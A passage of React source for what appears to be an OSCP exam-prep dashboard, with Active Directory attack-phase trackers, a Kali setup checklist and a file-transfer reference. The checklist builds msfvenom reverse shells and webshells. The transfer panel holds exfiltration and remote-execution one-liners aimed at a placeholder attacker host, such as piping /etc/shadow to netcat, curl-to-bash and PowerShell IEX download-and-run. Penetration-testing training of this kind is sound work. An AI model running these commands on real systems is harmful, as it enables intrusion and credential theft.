          <input value={state.ms01Flag||""} onChange={e=>s("ms01Flag",e.target.value)} placeholder="paste MS01 proof.txt hash..." style={{width:"100%",background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#44ff44",fontFamily:mono,fontSize:11,padding:"4px 8px",outline:"none",boxSizing:"border-box"}}/>
        </div>
        <Phase title="TUNNEL SETUP → INTERNAL NETWORK" timeGuide="15 min" items={AD_TUNNEL.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#44aaff"/>
        <Phase title="AD ENUMERATION (With Domain Creds)" timeGuide="20 min" items={AD_ENUM.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#aa66ff"/>
        <Phase title="🔀 LATERAL MOVEMENT → MS02" timeGuide="10-20 min" items={AD_LATMOV_MS02.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#ff8800"/>
      </>}

      {/* MS02: Connect → Privesc → Loot → Proof */}
      {sub==="ms02"&&<>
        <Phase title="MS02 — CONNECT (Lateral Movement)" timeGuide="10 min" items={AD_MS02_CONNECT.map(i=>({...i,id:`ad-ms02-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#44aaff"/>
        <Phase title="MS02 — LOCAL PRIVILEGE ESCALATION" timeGuide="30-60 min" items={AD_MS01_PRIVESC.map(i=>({...i,id:`ad-ms02-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ff6644"/>
        <Phase title="MS02 — POST-EXPLOITATION LOOT" timeGuide="15-20 min" items={AD_LOOT.map(i=>({...i,id:`ad-ms02-loot-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ffaa00"/>
        <Phase title="📸 MS02 — PROOF" items={AD_MS02_PROOF.map(i=>({...i,id:`ad-ms02-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ff4444"/>
        <div style={{padding:"4px 10px"}}>
          <div style={{fontSize:8,fontWeight:700,color:"#445566",fontFamily:mono,letterSpacing:1,marginBottom:2}}>MS02 PROOF.TXT FLAG</div>
          <input value={state.ms02Flag||""} onChange={e=>s("ms02Flag",e.target.value)} placeholder="paste MS02 proof.txt hash..." style={{width:"100%",background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#44ff44",fontFamily:mono,fontSize:11,padding:"4px 8px",outline:"none",boxSizing:"border-box"}}/>
        </div>
        <Phase title="🔀 LATERAL MOVEMENT → DC" timeGuide="15-30 min" items={AD_LATMOV_DC.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#ff4488"/>
      </>}

      {/* DC: Connect + Dump → Proof */}
      {sub==="dc"&&<>
        <Phase title="DC — CONNECT & DUMP" timeGuide="30-60 min" items={AD_DC.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#ff4444"/>
        <Phase title="📸 DC — PROOF" items={AD_DC_PROOF.map(i=>({...i,id:`ad-dc-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ff4444"/>
        <div style={{padding:"4px 10px"}}>
          <div style={{fontSize:8,fontWeight:700,color:"#445566",fontFamily:mono,letterSpacing:1,marginBottom:2}}>DC PROOF.TXT FLAG</div>
          <input value={state.dcFlag||""} onChange={e=>s("dcFlag",e.target.value)} placeholder="paste DC proof.txt hash..." style={{width:"100%",background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#44ff44",fontFamily:mono,fontSize:11,padding:"4px 8px",outline:"none",boxSizing:"border-box"}}/>
        </div>
      </>}

      {/* Complete AD Button */}
      <div style={{padding:"8px 10px"}}>
        <button onClick={()=>s("completed",true)} style={{width:"100%",padding:"10px",background:(state.ms01Flag&&state.dcFlag)?"rgba(68,255,68,0.1)":"rgba(100,130,160,0.05)",border:`2px solid ${(state.ms01Flag&&state.dcFlag)?"rgba(68,255,68,0.3)":"rgba(100,130,160,0.1)"}`,borderRadius:5,color:(state.ms01Flag&&state.dcFlag)?"#44ff44":"#445566",fontFamily:mono,fontSize:12,fontWeight:700,cursor:"pointer",letterSpacing:1}}>
          🏆 COMPLETE AD SET{!(state.ms01Flag&&state.dcFlag)?" — add flags first":""}
        </button>
      </div>
      <Phase title="AD STUCK? — EMERGENCY" timeGuide="when blocked" items={AD_STUCK.map(i=>({...i,id:`ad-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} color="#ff4444"/>
    </div>
  );
}

// ─── MAIN ──────────────────────────────────────────────
// ─── PRE-ENGAGEMENT CHECKLIST PANEL ───────────────────────
function PreEngagementPanel() {
  const [copied,setCopied] = useState(null);
  const [checked,setChecked] = useState(()=>{ try{return JSON.parse(localStorage.getItem("oscp_precheck")||"{}") }catch(e){return{}} });
  const toggle = id => { const n={...checked,[id]:!checked[id]}; setChecked(n); localStorage.setItem("oscp_precheck",JSON.stringify(n)) };
  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(cmd).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };
  const resetChecks = () => { setChecked({}); localStorage.removeItem("oscp_precheck") };

  const sections = [
    { title: "🔄 FRESH INSTALL & SYSTEM UPDATE", scenario: "Start with a clean, fully updated Kali. Snapshot before and after.", items: [
      { id:"p1", text:"Update and upgrade all packages", cmd:"sudo apt update && sudo apt full-upgrade -y" },
      { id:"p2", text:"Install missing core tools", cmd:"sudo apt install -y seclists curl enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf" },
      { id:"p3", text:"Install python3-venv if not present", cmd:"sudo apt install -y python3-venv python3-pip" },
      { id:"p4", text:"Verify rockyou.txt is extracted", cmd:"ls -la /usr/share/wordlists/rockyou.txt || sudo gunzip /usr/share/wordlists/rockyou.txt.gz" },
      { id:"p5", text:"Verify SecLists installed", cmd:"ls /usr/share/seclists/ || sudo apt install -y seclists" },
      { id:"p6", text:"Take a VM snapshot — CLEAN UPDATED STATE", cmd:"# VirtualBox: Snapshots → Take | VMware: VM → Snapshot → Take Snapshot" },
    ]},
    { title: "🐍 PYTHON VENV SETUP", scenario: "Kali's system Python breaks easily with --break-system-packages. Use a virtual environment to isolate your pentest Python tools. This prevents version conflicts and keeps your system clean.", items: [
      { id:"py1", text:"Create a dedicated pentest venv", cmd:"python3 -m venv ~/pentest-venv" },
      { id:"py2", text:"Activate the venv (do this before installing or running Python tools)", cmd:"source ~/pentest-venv/bin/activate" },
      { id:"py3", text:"Install all Python pentest tools inside the venv", cmd:"source ~/pentest-venv/bin/activate && pip install bloodhound impacket certipy-ad pycryptodomex uploadserver" },
      { id:"py4", text:"Verify tools installed correctly inside venv", cmd:"source ~/pentest-venv/bin/activate && bloodhound-python --help 2>&1 | head -1 && certipy --help 2>&1 | head -1" },
      { id:"py5", text:"Deactivate when done installing (aliases will handle activation)", cmd:"deactivate" },
      { id:"py6", text:"If a tool breaks, rebuild the venv cleanly", cmd:"rm -rf ~/pentest-venv && python3 -m venv ~/pentest-venv && source ~/pentest-venv/bin/activate && pip install bloodhound impacket certipy-ad pycryptodomex" },
    ]},
    { title: "⌨️ BASH ALIASES & SHORTCUTS", scenario: "Add aliases to ~/.bash_aliases so your Python venv tools work seamlessly without manually activating every time. Also add shortcuts for common commands you'll run constantly.", items: [
      { id:"ba1", text:"Create or append to ~/.bash_aliases", cmd:"touch ~/.bash_aliases" },
      { id:"ba2", text:"Alias: auto-activate venv for bloodhound-python", cmd:"echo 'alias bloodhound-py=\"source ~/pentest-venv/bin/activate && bloodhound-python\"' >> ~/.bash_aliases" },
      { id:"ba3", text:"Alias: auto-activate venv for certipy", cmd:"echo 'alias certipy=\"source ~/pentest-venv/bin/activate && certipy\"' >> ~/.bash_aliases" },
      { id:"ba4", text:"Alias: quick activate shortcut", cmd:"echo 'alias venv=\"source ~/pentest-venv/bin/activate\"' >> ~/.bash_aliases" },
      { id:"ba5", text:"Alias: start python upload server", cmd:"echo 'alias uploadserver=\"source ~/pentest-venv/bin/activate && python3 -m uploadserver 80\"' >> ~/.bash_aliases" },
      { id:"ba6", text:"Alias: quick HTTP server", cmd:"echo 'alias serve=\"python3 -m http.server 80\"' >> ~/.bash_aliases" },
      { id:"ba7", text:"Alias: start Responder", cmd:"echo 'alias respond=\"sudo responder -I tun0\"' >> ~/.bash_aliases" },
      { id:"ba8", text:"Alias: start Ligolo proxy", cmd:"echo 'alias ligolo=\"sudo ip link set ligolo up 2>/dev/null; ligolo-proxy -selfcert -laddr 0.0.0.0:11601\"' >> ~/.bash_aliases" },
      { id:"ba9", text:"Alias: rlwrap listener on 443", cmd:"echo 'alias listen=\"rlwrap nc -lvnp 443\"' >> ~/.bash_aliases" },
      { id:"ba10", text:"Alias: quick nmap full port scan", cmd:"echo 'alias nmapfull=\"sudo nmap -p- --min-rate 5000 -Pn\"' >> ~/.bash_aliases" },
      { id:"ba11", text:"Alias: quick nmap service scan", cmd:"echo 'alias nmapsvc=\"sudo nmap -sCV -Pn\"' >> ~/.bash_aliases" },
      { id:"ba12", text:"Reload aliases into current shell", cmd:"source ~/.bash_aliases" },
      { id:"ba13", text:"Verify aliases work", cmd:"alias | grep -E 'venv|serve|listen|nmap'" },
    ]},
    { title: "📂 FOLDER STRUCTURE SETUP", scenario: "Organize your working directory before the engagement. One folder per target, shared tools dir.", items: [
      { id:"f1", text:"Create main engagement directory", cmd:"mkdir -p ~/oscp-exam && cd ~/oscp-exam" },
      { id:"f2", text:"Create per-target folders (AD + 3 standalones)", cmd:"mkdir -p ~/oscp-exam/{ad/{ms01,ms02,dc},standalone1,standalone2,standalone3}" },
      { id:"f3", text:"Create loot and scans subdirs for each", cmd:"for d in ~/oscp-exam/ad/{ms01,ms02,dc} ~/oscp-exam/standalone{1,2,3}; do mkdir -p $d/{scans,loot,exploits,screenshots}; done" },
      { id:"f4", text:"Create shared notes file", cmd:"touch ~/oscp-exam/creds.txt ~/oscp-exam/notes.txt" },
    ]},
    { title: "⚔️ PRIVESC & TRANSFER TOOLS STAGING", scenario: "Pre-stage all tools you'll transfer to targets. Have them ready in organized folders so you don't waste exam time hunting.", items: [
      { id:"t1", text:"Create Windows tools directory", cmd:"mkdir -p ~/Windows && cd ~/Windows" },
      { id:"t2", text:"Download GodPotato (NET2 + NET4)", cmd:"wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe && wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" },
      { id:"t3", text:"Download PrintSpoofer", cmd:"wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe && wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe" },
      { id:"t4", text:"Download winPEASx64 + winPEASx86", cmd:"wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe && wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" },
      { id:"t5", text:"Download mimikatz", cmd:"wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip && unzip mimikatz_trunk.zip -d mimikatz" },
      { id:"t6", text:"Download Rubeus", cmd:"wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" },
      { id:"t7", text:"Download SharpHound", cmd:"wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound-v2.5.9.zip && unzip SharpHound-v2.5.9.zip -d SharpHound" },
      { id:"t8", text:"Download RunasCs", cmd:"wget https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip && unzip RunasCs.zip" },
      { id:"t9", text:"Download nc.exe (32 + 64)", cmd:"cp /usr/share/windows-binaries/nc.exe . && locate nc64.exe | head -1 | xargs cp -t ." },
      { id:"t10", text:"Download Chisel Windows + Linux", cmd:"# Get latest from https://github.com/jpillora/chisel/releases — download chisel_*_windows_amd64.gz and chisel_*_linux_amd64.gz" },
      { id:"t11", text:"Create Linux tools directory", cmd:"mkdir -p ~/Linux && cd ~/Linux" },
      { id:"t12", text:"Download linPEAS", cmd:"wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh" },
      { id:"t13", text:"Download pspy (cron/process snooper)", cmd:"wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64" },
      { id:"t14", text:"Download linux-exploit-suggester", cmd:"wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh" },
      { id:"t15", text:"Verify all tools are present", cmd:"echo '=== Windows ===' && ls -la ~/Windows/ && echo '=== Linux ===' && ls -la ~/Linux/" },
    ]},
    { title: "🐕 BLOODHOUND SETUP", scenario: "Install and configure BloodHound so it's ready to go. Test it works before the engagement.", items: [
      { id:"b1", text:"Install neo4j", cmd:"sudo apt install -y neo4j" },
      { id:"b2", text:"Start neo4j and set password (default neo4j:neo4j → change to neo4j:blood)", cmd:"sudo neo4j start && sleep 5 && echo 'Visit http://localhost:7474 — login neo4j:neo4j, change to neo4j:blood'" },
      { id:"b3", text:"Install BloodHound GUI", cmd:"sudo apt install -y bloodhound" },
      { id:"b4", text:"Verify bloodhound-python works (installed via venv above)", cmd:"source ~/pentest-venv/bin/activate && bloodhound-python --help 2>&1 | head -1" },
      { id:"b5", text:"Test BloodHound launches", cmd:"bloodhound &" },
      { id:"b6", text:"Download SharpHound for on-target collection", cmd:"wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound-v2.5.9.zip -O ~/Windows/SharpHound.zip" },
    ]},
    { title: "🔀 LIGOLO-NG SETUP", scenario: "Your go-to pivoting tool. Download both proxy and agent binaries, set up the tun interface.", items: [
      { id:"l1", text:"Download Ligolo proxy (Kali) + agents (Windows/Linux)", cmd:"# Get latest from https://github.com/nicocha30/ligolo-ng/releases — proxy_linux_amd64, agent_linux_amd64, agent_windows_amd64.exe" },
      { id:"l2", text:"Make proxy executable", cmd:"chmod +x proxy && sudo mv proxy /usr/local/bin/ligolo-proxy" },
      { id:"l3", text:"Stage agent binaries in tools folders", cmd:"cp agent ~/Linux/ligolo-agent && cp agent_windows_amd64.exe ~/Windows/ligolo-agent.exe" },
      { id:"l4", text:"Create tun interface (do this once, persists until reboot)", cmd:"sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up" },
      { id:"l5", text:"Test proxy starts", cmd:"ligolo-proxy -selfcert -laddr 0.0.0.0:11601" },
    ]},
    { title: "🖥️ TERMINAL LOGGING", scenario: "Log EVERY terminal command and output. This saves you during report writing and if you need to retrace steps.", items: [
      { id:"lg1", text:"Install tmux if not present", cmd:"sudo apt install -y tmux" },
      { id:"lg2", text:"Enable script logging in .bashrc — auto-logs all terminal sessions", cmd:"echo '# Auto-log terminal sessions\nif [ -z \"$SCRIPT_STARTED\" ]; then\n  export SCRIPT_STARTED=1\n  mkdir -p ~/oscp-exam/logs\n  script -aq ~/oscp-exam/logs/terminal-$(date +%Y%m%d-%H%M%S).log\nfi' >> ~/.bashrc" },
      { id:"lg3", text:"Alternative: start logging manually per terminal", cmd:"mkdir -p ~/oscp-exam/logs && script -a ~/oscp-exam/logs/terminal-$(date +%Y%m%d-%H%M%S).log" },
      { id:"lg4", text:"Enable bash history timestamps", cmd:"echo 'export HISTTIMEFORMAT=\"%F %T \"' >> ~/.bashrc && source ~/.bashrc" },
      { id:"lg5", text:"Increase bash history size", cmd:"echo 'export HISTSIZE=50000\nexport HISTFILESIZE=100000' >> ~/.bashrc && source ~/.bashrc" },
    ]},
    { title: "📸 SCREENSHOT WORKFLOW", scenario: "Set up screenshot tools so you can capture proof quickly. Every flag needs: proof.txt + whoami + hostname + ipconfig/ip addr in ONE screenshot.", items: [
      { id:"sc1", text:"Install Flameshot for quick annotated screenshots", cmd:"sudo apt install -y flameshot" },
      { id:"sc2", text:"Set Flameshot keybind (test it)", cmd:"flameshot gui &" },
      { id:"sc3", text:"Create screenshots directory", cmd:"mkdir -p ~/oscp-exam/screenshots" },
      { id:"sc4", text:"Configure Flameshot save path", cmd:"flameshot config --savepath ~/oscp-exam/screenshots" },
      { id:"sc5", text:"Linux proof command (copy-paste ready)", cmd:"cat /root/proof.txt && whoami && hostname && ip addr show" },
      { id:"sc6", text:"Linux user flag command", cmd:"cat /home/*/local.txt && whoami && hostname && ip addr show" },
      { id:"sc7", text:"Windows admin proof command", cmd:"type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig" },
      { id:"sc8", text:"Windows user flag command", cmd:"type C:\\Users\\*\\Desktop\\local.txt & whoami & hostname & ipconfig" },
    ]},
    { title: "🔫 PRE-GENERATE PAYLOADS", scenario: "Build your reverse shell payloads BEFORE the engagement so you're not wasting time during.", items: [
      { id:"pg1", text:"Windows x64 EXE reverse shell", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe -o ~/Windows/rev64.exe" },
      { id:"pg2", text:"Windows x86 EXE reverse shell", cmd:"msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe -o ~/Windows/rev32.exe" },
      { id:"pg3", text:"Linux x64 ELF reverse shell", cmd:"msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f elf -o ~/Linux/rev64.elf && chmod +x ~/Linux/rev64.elf" },
      { id:"pg4", text:"ASPX webshell for IIS", cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f aspx -o ~/Windows/shell.aspx" },
      { id:"pg5", text:"WAR file for Tomcat", cmd:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f war -o ~/Windows/shell.war" },
      { id:"pg6", text:"Copy PHP reverse shell for editing", cmd:"cp /usr/share/webshells/php/php-reverse-shell.php ~/Linux/shell.php" },
      { id:"pg7", text:"NOTE: Regenerate these with your actual tun0 IP once VPN is connected" },
    ]},
    { title: "🧪 FINAL VERIFICATION", scenario: "Run through these checks to confirm everything works before you start.", items: [
      { id:"v1", text:"Verify nmap works", cmd:"nmap --version" },
      { id:"v2", text:"Verify gobuster works", cmd:"gobuster version" },
      { id:"v3", text:"Verify netexec/crackmapexec works", cmd:"nxc --version 2>/dev/null || crackmapexec --version" },
      { id:"v4", text:"Verify evil-winrm works", cmd:"evil-winrm --version 2>/dev/null || gem install evil-winrm" },
      { id:"v5", text:"Verify impacket tools", cmd:"impacket-secretsdump --help 2>&1 | head -1" },
      { id:"v6", text:"Verify Burp Suite launches", cmd:"burpsuite &" },
      { id:"v7", text:"Verify Ligolo proxy starts", cmd:"ligolo-proxy -selfcert -laddr 0.0.0.0:11601 &" },
      { id:"v8", text:"Verify all Windows tools staged", cmd:"ls -la ~/Windows/" },
      { id:"v9", text:"Verify all Linux tools staged", cmd:"ls -la ~/Linux/" },
      { id:"v10", text:"Take FINAL VM snapshot — ENGAGEMENT READY", cmd:"# Snapshot name: 'ENGAGEMENT-READY-$(date +%Y%m%d)'" },
    ]},
  ];

  const total = sections.reduce((a,s)=>a+s.items.length,0);
  const done = Object.values(checked).filter(Boolean).length;

  return (
    <div style={{borderBottom:"1px solid rgba(170,130,255,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(170,130,255,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:5,flexWrap:"wrap",gap:8}}>
        <div style={{display:"flex",alignItems:"center",gap:10}}>
          <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#aa88ff",letterSpacing:1}}>🛡️ PRE-ENGAGEMENT CHECKLIST</span>
          <span style={{fontSize:10,fontFamily:mono,color:done===total?"#44ff44":"#aa88ff"}}>{done}/{total}</span>
          <div style={{width:80,height:4,background:"rgba(170,130,255,0.15)",borderRadius:2,overflow:"hidden"}}><div style={{width:`${(done/total)*100}%`,height:"100%",background:done===total?"#44ff44":"#aa88ff",borderRadius:2,transition:"width 0.3s"}}/></div>
        </div>
        <button onClick={resetChecks} style={{background:"rgba(255,68,68,0.06)",border:"1px solid rgba(255,68,68,0.15)",color:"#663333",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>RESET CHECKS</button>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(420px, 1fr))",gap:0}}>
        {sections.map(sec=>{ const secDone=sec.items.filter(i=>checked[i.id]).length; return (
          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
            <div style={{padding:"6px 10px",background:"rgba(170,130,255,0.03)",borderBottom:"1px solid rgba(170,130,255,0.06)",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#aa88ff"}}>{sec.title}</span>
              <span style={{fontSize:9,fontFamily:mono,color:secDone===sec.items.length?"#44ff44":"#556677"}}>{secDone}/{sec.items.length}</span>
            </div>
            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(170,130,255,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{fontSize:9.5,fontFamily:mono,color:"#8877aa",lineHeight:1.5}}>{sec.scenario}</span>
            </div>}
            {sec.items.map(item=>(
              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)",opacity:checked[item.id]?0.5:1}}>
                <input type="checkbox" checked={!!checked[item.id]} onChange={()=>toggle(item.id)} style={{marginTop:3,accentColor:"#aa88ff",cursor:"pointer"}}/>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:10.5,fontFamily:mono,color:checked[item.id]?"#556677":"#e8edf2",lineHeight:1.4,textDecoration:checked[item.id]?"line-through":"none"}}>{item.text}</div>
                  {item.cmd&&<div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd}</div>}
                </div>
                {item.cmd&&<button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(170,130,255,0.15)":"none",border:"none",color:copied===item.id?"#aa88ff":"#334455",cursor:"pointer",fontSize:10,padding:"2px 4px",fontFamily:mono,flexShrink:0,marginTop:2}}>{copied===item.id?"✓":"📋"}</button>}
              </div>
            ))}
          </div>
        )})}
      </div>
    </div>
  );
}

// ─── TRANSFERS REFERENCE PANEL ─────────────────────────────
function TransfersPanel() {
  const [copied,setCopied] = useState(null);
  const [kaliIp,setKaliIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [kaliPort,setKaliPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const [appliedIp,setAppliedIp] = useState(localStorage.getItem("oscp_kali_ip")||"");
  const [appliedPort,setAppliedPort] = useState(localStorage.getItem("oscp_kali_port")||"");
  const apply = () => { setAppliedIp(kaliIp); setAppliedPort(kaliPort); localStorage.setItem("oscp_kali_ip",kaliIp); localStorage.setItem("oscp_kali_port",kaliPort) };
  const sub = cmd => {
    if (!cmd) return "";
    let t = cmd;
    if (appliedIp) t = t.replace(/KALI/g, appliedIp);
    if (appliedPort) t = t.replace(/\b443\b/g, appliedPort).replace(/\b4444\b/g, appliedPort);
    return t;
  };
  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(sub(cmd)).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };

  const sections = [
    { title: "🐍 SERVE FILES FROM KALI", scenario: "Start a file server on your Kali box first, then download from the target.", items: [
      { id:"sv1", text:"Python HTTP server — quick and universal", cmd:"python3 -m http.server 80" },
      { id:"sv2", text:"Python HTTPS server — if target blocks HTTP", cmd:"python3 -c \"import http.server,ssl;s=http.server.HTTPServer(('0.0.0.0',443),http.server.SimpleHTTPRequestHandler);s.socket=ssl.wrap_socket(s.socket,certfile='cert.pem',server_side=True);s.serve_forever()\"" },
      { id:"sv3", text:"SMB server — best for Windows, no disk write needed", cmd:"impacket-smbserver share . -smb2support" },
      { id:"sv4", text:"SMB server with auth — if anonymous blocked", cmd:"impacket-smbserver share . -smb2support -user a -password a" },
      { id:"sv5", text:"Nginx one-liner — faster for large files", cmd:"python3 -m uploadserver 80" },
    ]},
    { title: "📥 DOWNLOAD ON LINUX TARGET", scenario: "You have a shell on a Linux box and need to pull tools or exploits from Kali.", items: [
      { id:"dl1", text:"wget — most common", cmd:"wget http://KALI/file -O /tmp/file" },
      { id:"dl2", text:"curl — alternative to wget", cmd:"curl http://KALI/file -o /tmp/file" },
      { id:"dl3", text:"curl pipe to bash — execute without saving to disk", cmd:"curl http://KALI/linpeas.sh | bash" },
      { id:"dl4", text:"Netcat receive — if wget/curl unavailable", cmd:"nc -lvp 4444 > file  # on target, then: nc TARGET 4444 < file  # from kali" },
      { id:"dl5", text:"SCP — if you have SSH creds", cmd:"scp kali@KALI:/path/to/file /tmp/file" },
      { id:"dl6", text:"Base64 decode — for copy-paste small files", cmd:"echo 'BASE64_STRING' | base64 -d > file" },
    ]},
    { title: "📥 DOWNLOAD ON WINDOWS TARGET", scenario: "You have a shell on a Windows box and need to pull tools from Kali.", items: [
      { id:"dw1", text:"certutil — works on almost every Windows box", cmd:"certutil -urlcache -f http://KALI/file C:\\temp\\file" },
      { id:"dw2", text:"PowerShell IWR — most common PS method", cmd:"iwr http://KALI/file -OutFile C:\\temp\\file" },
      { id:"dw3", text:"PowerShell WebClient — alternative", cmd:"(New-Object Net.WebClient).DownloadFile('http://KALI/file','C:\\temp\\file')" },
      { id:"dw4", text:"PowerShell download + execute in memory", cmd:"IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')" },
      { id:"dw5", text:"Copy from SMB share — no disk artifact on Kali", cmd:"copy \\\\KALI\\share\\file C:\\temp\\file" },
      { id:"dw6", text:"Connect SMB with auth first", cmd:"net use \\\\KALI\\share /user:a a && copy \\\\KALI\\share\\file C:\\temp\\file" },
      { id:"dw7", text:"Bitsadmin — stealthy background transfer", cmd:"bitsadmin /transfer job http://KALI/file C:\\temp\\file" },
      { id:"dw8", text:"Base64 decode — for small file copy-paste", cmd:"[IO.File]::WriteAllBytes('C:\\temp\\file',[Convert]::FromBase64String('BASE64_STRING'))" },
    ]},
    { title: "📤 EXFIL — Linux Target → Kali", scenario: "Pull loot off a compromised Linux box back to your Kali.", items: [
      { id:"el1", text:"Netcat — Kali receives", cmd:"nc -lvnp 4444 > loot.txt" },
      { id:"el2", text:"Netcat — target sends", cmd:"cat /etc/shadow | nc KALI 4444" },
      { id:"el3", text:"Tar + netcat — exfil entire directory", cmd:"tar czf - /path/to/dir | nc KALI 4444" },
      { id:"el4", text:"Base64 encode — then copy-paste from terminal", cmd:"base64 -w 0 file.txt" },
      { id:"el5", text:"SCP from target to Kali", cmd:"scp /path/to/loot kali@KALI:/tmp/" },
    ]},
    { title: "📤 EXFIL — Windows Target → Kali", scenario: "Pull loot off a compromised Windows box back to your Kali.", items: [
      { id:"ew1", text:"Start SMB server on Kali first", cmd:"impacket-smbserver share . -smb2support" },
      { id:"ew2", text:"Copy file from Windows to Kali SMB share", cmd:"copy C:\\loot.txt \\\\KALI\\share\\" },
      { id:"ew3", text:"Copy entire directory to Kali", cmd:"xcopy C:\\Users\\Administrator\\Desktop \\\\KALI\\share\\loot\\ /E /Y" },
      { id:"ew4", text:"PowerShell upload to Kali HTTP upload server", cmd:"Invoke-WebRequest -Uri http://KALI/upload -Method POST -InFile C:\\loot.txt" },
      { id:"ew5", text:"Base64 encode for copy-paste", cmd:"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\loot.txt'))" },
      { id:"ew6", text:"Decode base64 on Kali", cmd:"echo 'BASE64' | base64 -d > file.txt" },
    ]},
  ];

  return (
    <div style={{borderBottom:"1px solid rgba(68,170,255,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(68,170,255,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:5,flexWrap:"wrap",gap:8}}>
        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#44aaff",letterSpacing:1}}>📦 FILE TRANSFER REFERENCE</span>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>KALI IP:</span>
          <input value={kaliIp} onChange={e=>setKaliIp(e.target.value)} onKeyDown={e=>e.key==="Enter"&&apply()} placeholder="10.10.14.x" style={{width:110,background:"rgba(0,0,0,0.4)",border:`1px solid ${kaliIp!==appliedIp?"rgba(255,170,0,0.4)":"rgba(68,170,255,0.2)"}`,borderRadius:3,color:"#44aaff",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>PORT:</span>
